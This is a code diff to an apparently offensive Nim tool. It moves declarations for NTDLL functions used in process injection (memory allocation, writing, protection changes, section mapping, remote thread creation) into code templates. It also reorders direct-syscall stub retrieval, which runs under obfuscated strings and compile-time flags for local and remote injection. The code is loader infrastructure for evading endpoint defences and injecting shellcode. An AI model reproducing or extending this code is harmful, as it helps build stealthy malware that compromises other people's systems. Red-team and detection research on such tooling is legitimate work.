@@ -79,7 +79,39 @@ when defined(GetSyscallStub):
     
     var 
         SYSCALL_STUB_SIZE: int = 23
+
+    # Unmanaged NTDLL Declarations
+
+    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+
+    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+
+    var NtCreateThreadEx: myNtCreateThreadEx
+
+    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
     
+    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+    
+    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+
+    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
+
+    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
+
+
     
     type
       CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
@@ -167,77 +199,7 @@ when defined(GetSyscallStub):
 """
 
 
-
-let NtProtectVirtualMemoryDelegate * = """
-  
-"""
-
-
-let NtWriteVirtualMemoryDelegate * = """
-    
-"""
-
-
-let NtCloseDelegate * = """
-   
-"""
-
-let NtAllocateVirtualMemoryDelegate * = """
-    
-
-"""
-
-let NtCreateThreadExDelegatePE * = """
-
-  
-"""
-
-let NtCreateSectionDelegate * = """
- 
-"""
-
-let NtMapViewOfSectionDelegate * = """
- 
-"""
-
 let RetrieveSyscallStubs * = """
-
-    # Unmanaged NTDLL Declaration
-    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
-    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}
-
-
-    # Unmanaged NTDLL Declaration
-    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-
-    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
-
-    var NtCreateThreadEx: myNtCreateThreadEx
-
-    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
-    
-    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-    
-    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-
-
-    # Unmanaged NTDLL Declaration
-    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-
-    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-
-    # Unmanaged NTDLL Declaration
-    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
-
-    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
-
-    # Unmanaged NTDLL Declaration
-    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
-
-    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
 
 
     var hProcess: HANDLE
@@ -293,6 +255,13 @@ let RetrieveSyscallStubs * = """
     when defined(verbose):
         echo obf("[*] GetSyscallStub NtAllocateVirtualMemory: ") & $syssuccess
     
+    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (7 * cast[HANDLE](SYSCALL_STUB_SIZE))
+    # define NtClose
+    NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
+    syssuccess = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtClose: ") & $syssuccess
+
     when defined(LocalCreateThread):
         var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
         NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
@@ -314,13 +283,7 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtMapViewOfSection"), cast[LPVOID](syscallStub_NtMapViewOfSection))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtMapViewOfSection: ") & $syssuccess
-        
-        var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (7 * cast[HANDLE](SYSCALL_STUB_SIZE))
-        # define NtClose
-        NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
-        syssuccess = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
-        when defined(verbose):
-            echo obf("[*] GetSyscallStub NtClose: ") & $syssuccess
+
 
 
     when defined(remoteinject):
@@ -338,10 +301,9 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
-"""
 
 
-let NtProtectSyscallStart * = """
+    
 
 """
 
@@ -388,28 +350,7 @@ let DInvokeUnhookStubs * = """
     MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
 """
 
-let UnhookSyscalls * = """
-    
-
-"""
-
-let LocalInjectDelegates * = """
-   
-"""
-
-let NtCreateThreadExDelegate * = """
-   
-"""
-
-let RemoteInjectDelegates * = """
-
-"""
-
 let SyscallStubSizeStub * = """
 var 
     SYSCALL_STUB_SIZE: int = 23
-"""
-
-let ProtectWriteAllocSyscalls * = """
-    
 """
